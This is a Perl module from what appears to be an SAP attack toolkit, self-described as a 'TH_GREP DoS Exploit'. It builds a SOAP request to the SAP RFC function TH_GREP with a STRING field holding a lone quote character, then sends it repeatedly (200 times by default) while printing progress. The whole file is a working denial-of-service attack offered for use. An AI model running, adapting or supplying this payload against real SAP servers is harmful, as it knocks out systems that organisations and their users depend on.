#!/usr/bin/perl
# Module TH_GREP DoS

# CONFIG
######################
my $desc ="!Check! TH_GREP DoS Exploit: \n\t Usage: black.pl .. .. -m id_module <num> - packet count, default is 200\n\n"; 
our $funcName="th_grep_dos_Func";

######################
push(@descriptions,$desc);
push(@functions,$funcName);
######################


# Special function
######################

sub th_grep_dos_Func()
{

	my $XML='<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
	<SOAP-ENV:Body>
		<m:TH_GREP xmlns:m="urn:sap-com:document:sap:rfc:functions">
			<RESULT>
				<item>
					<LINE>xxx</LINE>
				</item>
			</RESULT>
			<STRING>\'
			</STRING>
		</m:TH_GREP>
	</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
';

	if ($ARGV[$m_arg_i+1]){
		$num=$ARGV[$m_arg_i+1];
		print $num." - num \n\n";
	} else {
		$num=200;
	}
	
	print "Start DoS!\n";
	for (my $i=0;$i<$num;$i++)
	{
		send_soap($XML,0);
		$prc = int($i*100/$num);
		
		if(($prc%10)==0)
			{ print "$prc% - Done! ($i-$num)\n"; };
	}
	
	print "\n";
	

}